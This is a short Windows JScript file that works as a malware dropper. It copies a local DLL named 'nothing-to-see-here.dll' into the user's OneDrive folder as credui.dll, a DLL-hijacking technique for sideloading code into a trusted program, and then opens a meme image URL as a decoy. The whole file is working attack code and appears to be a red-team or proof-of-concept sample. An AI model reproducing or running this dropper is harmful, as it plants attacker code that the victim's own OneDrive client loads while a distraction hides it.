var shell = new ActiveXObject("WScript.Shell");
var env = shell.Environment("Process");
var lad = env("LOCALAPPDATA");
var destination = lad + "\\Microsoft\\OneDrive\\credui.dll";

var fso = new ActiveXObject("Scripting.FileSystemObject");
var source = fso.GetAbsolutePathName(".") + "\\" + "nothing-to-see-here.dll";
fso.CopyFile(source, destination, true);

var decoyURL = "https://i.imgflip.com/20pfsv.jpg"
shell.Run(decoyURL);

